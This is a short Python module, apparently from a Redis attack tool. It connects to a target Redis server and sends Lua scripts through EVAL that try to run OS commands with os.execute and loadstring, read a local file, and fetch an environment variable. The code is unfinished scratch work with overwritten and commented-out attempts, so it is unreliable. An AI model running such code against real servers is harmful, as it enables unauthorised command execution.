# -*- coding: utf-8 -*-

import six
import redis
import logging

log = logging.getLogger()


# ----------------------------------------------------------------------
def action_redis_shell(config):
	"""
	Dump all redis information
	"""
	log.warning("Trying to connect with redis server...")

	# Connection with redis
	con = redis.StrictRedis(host=config.target, port=config.port, db=config.db)

	# LUA script
	lua_script = '''local value = os.execute(ls)
	return value'''
	# lua_script = '''
	# eval "os.execute(ls)"
	# '''

	# script = con.register_script(lua_script)
	# con.eval('os.execute("ls")', None)
	# script = con.script_load(lua_script)


	lua_script = "print('/home/parallels/hola.txt')"
	lua_script = 'string.find("hello Lua users", "Lua")'
	lua_script = "dofile('/home/parallels/hola.txt')"
	lua_script = """local code = [[
		os.execute("ls")
	]]
	local h = loadstring(code)
	return h()"""
	# lua_script = """
	# local x = "Hello World"
	# local code = string.dump(function() print(x) end)
	# local hi = loadstring(code)
	# return hi()
	# """
	lua_script="""
	return os.getenv"USER"
	"""
	print(con.eval(lua_script, 0))

	# c = con.script_load(lua_script)
	# con.evalsha(c, 0)